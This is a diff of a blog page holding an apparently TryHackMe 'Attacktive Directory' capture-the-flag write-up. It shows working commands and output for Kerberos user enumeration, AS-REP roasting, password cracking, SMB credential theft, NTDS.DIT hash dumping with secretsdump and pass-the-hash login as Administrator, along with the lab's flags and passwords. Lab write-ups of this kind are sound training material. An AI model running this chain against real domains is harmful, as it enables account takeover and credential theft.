@@ -39,7 +39,8 @@
     <h1>0xskar@home:~$</h1>
     </a>
     <div class="header-links">
-      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+      <a href="/resources"><h2 class="header-link">Resources</h2></a>
+<a href="/archive"><h2 class="header-link">Archive</h2></a>
 <a href="/about"><h2 class="header-link">About</h2></a>
 <a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
     </div>
@@ -60,12 +61,12 @@
 
 <h2 id="task-3---welcome-to-attacktive-directory"><a href="#header-2"></a>Task 3 - Welcome to Attacktive Directory</h2>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(0xskar㉿cocokali)-[~/thm/AttacktiveDirectory]
-└─$ nmap -sV -sC -T4 10.10.132.136 -p- -oN initial
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 06:44 PDT
-Nmap scan report for 10.10.132.136
-Host is up (0.20s latency).
-Not shown: 65508 closed tcp ports (conn-refused)
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>0xskar㉿cocokali<span class="o">)</span>-[~/thm/AttacktiveDirectory]
+└─<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> 10.10.132.136 <span class="nt">-p-</span> <span class="nt">-oN</span> initial
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-06-20 06:44 PDT
+Nmap scan report <span class="k">for </span>10.10.132.136
+Host is up <span class="o">(</span>0.20s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65508 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
 80/tcp    open  http          Microsoft IIS httpd 10.0
@@ -73,18 +74,18 @@ PORT      STATE SERVICE       VERSION
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
 |_http-title: IIS Windows Server
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-20 13:52:51Z)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2022-06-20 13:52:51Z<span class="o">)</span>
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: spookysec.local0., Site: Default-First-Site-Name<span class="o">)</span>
 445/tcp   open  microsoft-ds?
 464/tcp   open  kpasswd5?
 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: spookysec.local0., Site: Default-First-Site-Name<span class="o">)</span>
 3269/tcp  open  tcpwrapped
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
-|_ssl-date: 2022-06-20T13:53:52+00:00; 0s from scanner time.
+|_ssl-date: 2022-06-20T13:53:52+00:00<span class="p">;</span> 0s from scanner time.
 | rdp-ntlm-info: 
 |   Target_Name: THM-AD
 |   NetBIOS_Domain_Name: THM-AD
@@ -93,14 +94,14 @@ PORT      STATE SERVICE       VERSION
 |   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
 |   Product_Version: 10.0.17763
 |_  System_Time: 2022-06-20T13:53:44+00:00
-| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>AttacktiveDirectory.spookysec.local
 | Not valid before: 2022-06-19T13:26:08
 |_Not valid after:  2022-12-19T13:26:08
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 9389/tcp  open  mc-nmf        .NET Message Framing
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 49664/tcp open  msrpc         Microsoft Windows RPC
@@ -114,18 +115,18 @@ PORT      STATE SERVICE       VERSION
 49684/tcp open  msrpc         Microsoft Windows RPC
 49695/tcp open  msrpc         Microsoft Windows RPC
 49806/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+Service Info: Host: ATTACKTIVEDIREC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | smb2-security-mode: 
 |   3.1.1: 
 |_    Message signing enabled and required
 | smb2-time: 
-|   date: 2022-06-20T13:53:46
+|   <span class="nb">date</span>: 2022-06-20T13:53:46
 |_  start_date: N/A
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 576.98 seconds
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>576.98 seconds
 </code></pre></div></div>
 
 <h5 id="answer-the-questions-below"><a href="#header-5"></a>Answer the questions below</h5>
@@ -151,10 +152,252 @@ Nmap done: 1 IP address (1 host up) scanned in 576.98 seconds
 
 <hr />
 
-<h2 id="task-3---welcome-to-attacktive-directory-1"><a href="#header-2"></a>Task 3 - Welcome to Attacktive Directory</h2>
+<h2 id="task-4---enumeration-enumerating-users-via-kerberos"><a href="#header-2"></a>Task 4 - Enumeration Enumerating Users via Kerberos</h2>
+
+<p>Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called Kerbrute (by Ronnie Flathers @ropnop) to brute force discovery of users, passwords and even password spray!</p>
 
 <h5 id="answer-the-questions-below-1"><a href="#header-5"></a>Answer the questions below</h5>
 
+<p><strong>What command within Kerbrute will allow us to enumerate valid usernames?</strong></p>
+
+<ul>
+  <li>userenum</li>
+</ul>
+
+<p><strong>What notable account is discovered? (These should jump out at you)</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">./kerbrute_linux_amd64 userenum --dc 10.10.132.136:88 -d spookysec.local userlist.txt</code></li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2022/06/20 07:49:18 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       james@spookysec.local
+2022/06/20 07:49:21 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       svc-admin@spookysec.local
+2022/06/20 07:49:25 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       James@spookysec.local
+2022/06/20 07:49:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       robin@spookysec.local
+2022/06/20 07:49:43 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       darkstar@spookysec.local
+2022/06/20 07:49:53 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       administrator@spookysec.local
+2022/06/20 07:50:12 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       backup@spookysec.local
+2022/06/20 07:50:21 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       paradox@spookysec.local
+2022/06/20 07:51:19 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       JAMES@spookysec.local
+2022/06/20 07:51:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       Robin@spookysec.local
+2022/06/20 07:53:35 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       Administrator@spookysec.local
+2022/06/20 07:57:30 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       Darkstar@spookysec.local
+2022/06/20 07:58:45 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       Paradox@spookysec.local
+2022/06/20 08:03:03 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       DARKSTAR@spookysec.local
+2022/06/20 08:04:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       ori@spookysec.local
+2022/06/20 08:06:32 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:       ROBIN@spookysec.local
+</code></pre></div></div>
+
+<p><strong>What is the other notable account is discovered? (These should jump out at you)</strong></p>
+
+<ul>
+  <li>svc-admin</li>
+</ul>
+
+<p><strong>What is the other notable account is discovered? (These should jump out at you)</strong></p>
+
+<ul>
+  <li>backup</li>
+</ul>
+
+<hr />
+
+<h2 id="task-5---exploitation-abusing-kerberos"><a href="#header-2"></a>Task 5 - Exploitation Abusing Kerberos</h2>
+
+<p>After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege “Does not require Pre-Authentication” set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.</p>
+
+<h5 id="answer-the-questions-below-2"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/opt/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.10.132.136 -usersfile users.txt -format hashcat -outputfile hashes.txt</code></li>
+  <li>svc-admin</li>
+</ul>
+
+<p><strong>Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f45f55f20e6fab0b565c84565e77bf8c$6fc870818e2691f65612966f462ec3d973acaeab9cd87dcf13e50a9454945c8de2f046e6b02f440b5232c9cc34cb18f4485915206a8e3264c4aee2e9442ff8104c9389ab4ae875c90916b5accb02680e7e781a71c95df510ffc11a3fc36cb0ae36bb48b03a8ebd617c1a3532e3e439acf5e4d097498aa91c08aa3ded9a54ad91a7aefcfa1ac4ee47f5bb85e38f9174bdac51a7a3896b52833f5448f246d08797f199e004ea4ecd77f6b57d01a26e6930fea74f331143f356d392c6f8ec8f394b1602557611cb585fe2d189cf5d01f7a1a272255b4f350640104b94c40cb8605b3eff072fc5e502fe49e5230c26384012e952
+</code></pre></div></div>
+
+<ul>
+  <li>https://hashcat.net/wiki/doku.php?id=example_hashes</li>
+  <li>Kerberos 5, etype 23, AS-REP</li>
+</ul>
+
+<p><strong>What mode is the hash?</strong></p>
+
+<ul>
+  <li>https://hashcat.net/wiki/doku.php?id=example_hashes</li>
+  <li>18200</li>
+</ul>
+
+<p><strong>Now crack the hash with the modified password list provided, what is the user accounts password?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">john --wordlist=passwordlist.txt --format=krb5asrep hash.txt</code></li>
+  <li>management2005</li>
+</ul>
+
+<hr />
+
+<h2 id="task-5-exploitation-abusing-kerberos"><a href="#header-2"></a>Task 5 Exploitation Abusing Kerberos</h2>
+
+<h3 id="enumeration"><a href="#header-3"></a>Enumeration:</h3>
+
+<p>With a user’s account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.</p>
+
+<p><code class="language-plaintext highlighter-rouge">man smbclient</code></p>
+
+<h5 id="answer-the-questions-below-3"><a href="#header-5"></a>Answer the questions below</h5>
+
+<p><strong>What utility can we use to map remote SMB shares?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">smbclient</code></li>
+</ul>
+
+<p><strong>Which option will list shares?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-L</code></li>
+</ul>
+
+<p><strong>How many remote shares is the server listing?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">smbclient -L \\\\10.10.132.136 --workgroup=spookysec.local -U "svc-admin"</code></li>
+  <li>6 shares</li>
+</ul>
+
+<p><strong>There is one particular share that we have access to that contains a text file. Which share is it?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">smbclient \\\\10.10.132.136\\backup\\ --workgroup=spookysec.local -U "svc-admin"</code></li>
+</ul>
+
+<p><strong>What is the content of the file?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">mget backup_credentials.txt</code></li>
+  <li>YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</li>
+</ul>
+
+<p><strong>Decoding the contents of the file, what is the full contents?</strong></p>
+
+<ul>
+  <li>base64 decrypt = <code class="language-plaintext highlighter-rouge">backup@spookysec.local:backup2517860</code></li>
+</ul>
+
+<hr />
+
+<h2 id="task-7---domain-privilege-escalation---elevating-privileges-within-the-domain"><a href="#header-2"></a>Task 7 - Domain Privilege Escalation - Elevating Privileges within the Domain</h2>
+
+<p>Now that we have <code class="language-plaintext highlighter-rouge">backup@spookysec.local:backup2517860</code> We can use another tool within Impacket called “secretsdump.py”. This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the (AD) Active Directory Domain.</p>
+
+<h5 id="answer-the-questions-below-4"><a href="#header-5"></a>Answer the questions below</h5>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>0xskar㉿cocokali<span class="o">)</span>-[~/thm/AttacktiveDirectory]
+└─<span class="nv">$ </span>/opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.132.136 <span class="nt">-outputfile</span> secretsdump.txt 
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+spookysec.local<span class="se">\s</span>kidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local<span class="se">\b</span>reakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local<span class="se">\j</span>ames:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+spookysec.local<span class="se">\o</span>ptional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+spookysec.local<span class="se">\s</span>herlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+spookysec.local<span class="se">\d</span>arkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+spookysec.local<span class="se">\O</span>ri:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
+spookysec.local<span class="se">\r</span>obin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
+spookysec.local<span class="se">\p</span>aradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
+spookysec.local<span class="se">\M</span>uirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
+spookysec.local<span class="se">\h</span>orshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
+spookysec.local<span class="se">\s</span>vc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+spookysec.local<span class="se">\b</span>ackup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
+spookysec.local<span class="se">\a</span><span class="nt">-spooks</span>:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+ATTACKTIVEDIREC<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:e3a602bef4ccbcbc0c468b0dd6d50e7d:::
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
+</code></pre></div></div>
+
+<p><strong>What method allowed us to dump NTDS.DIT?</strong></p>
+
+<ul>
+  <li>DRSUAPI</li>
+</ul>
+
+<p><strong>What is the Administrators NTLM hash?</strong></p>
+
+<ul>
+  <li>0e0363213e37b94221497260b0bcb4fc</li>
+</ul>
+
+<p><strong>What method of attack could allow us to authenticate as the user without the password?</strong></p>
+
+<ul>
+  <li>Pass the Hash</li>
+</ul>
+
+<p><strong>Using a tool called Evil-WinRM what option will allow us to use a hash?</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">evil-winrm -h</code> -H, –hash HASH                  NTHash</li>
+</ul>
+
+<hr />
+
+<h2 id="task-8---flag-submission-flag-submission-panel"><a href="#header-2"></a>Task 8 - Flag Submission Flag Submission Panel</h2>
+
+<p>Cool site: https://wadcoms.github.io/#</p>
+
+<p>Submit the flags for each user account. They can be located on each user’s desktop.</p>
+
+<h5 id="answer-the-questions-below-5"><a href="#header-5"></a>Answer the questions below</h5>
+
+<h3 id="svc-admin"><a href="#header-3"></a>svc-admin</h3>
+
+<ul>
+  <li>credentials user:svc-admin pass:management2005</li>
+  <li>TryHackMe{K3rb3r0s_Pr3_4uth}</li>
+</ul>
+
+<h3 id="backup"><a href="#header-3"></a>backup</h3>
+
+<ul>
+  <li>credentials user:backup pass:backup2517860</li>
+  <li>TryHackMe{B4ckM3UpSc0tty!}</li>
+</ul>
+
+<h3 id="administrator"><a href="#header-3"></a>Administrator</h3>
+
+<ul>
+  <li>credentials user:Administrator pass: We can Pass the Hash with below command.</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>0xskar㉿cocokali<span class="o">)</span>-[~/thm/AttacktiveDirectory]
+└─<span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.132.136 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 0e0363213e37b94221497260b0bcb4fc
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>TryHackMe{4ctiveD1rectoryM4st3r}</li>
+</ul>
+
+<hr />
 
 </article>
       </section>
